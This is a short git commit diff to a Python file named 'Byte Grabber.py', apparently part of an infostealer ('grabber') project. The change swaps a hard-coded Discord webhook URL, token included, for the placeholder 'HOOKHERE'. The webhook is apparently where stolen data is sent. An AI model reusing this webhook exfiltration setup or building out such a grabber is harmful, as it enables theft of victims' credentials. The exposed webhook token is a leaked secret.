0c24b7107fd7a23b0bb747b3763a4c1cbc5f9fff
ByteSystemz <116411984+ByteSystemz@users.noreply.github.com>
2022-12-19 14:14:38 -0500

    Update Byte Grabber.py

--- Byte Grabber/Byte Grabber/Byte Grabber.py
+++ Byte Grabber/Byte Grabber/Byte Grabber.py
@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "https://discord.com/api/webhooks/1052766085688074320/YZXSLHhIIsGCqYZBjYDit-ap76dpYO53Rs7OLVcd2HB39gGj4YSfcI_aeR_HNzLCa2M4"
+hook = "HOOKHERE"
 
 
 DETECTED = False
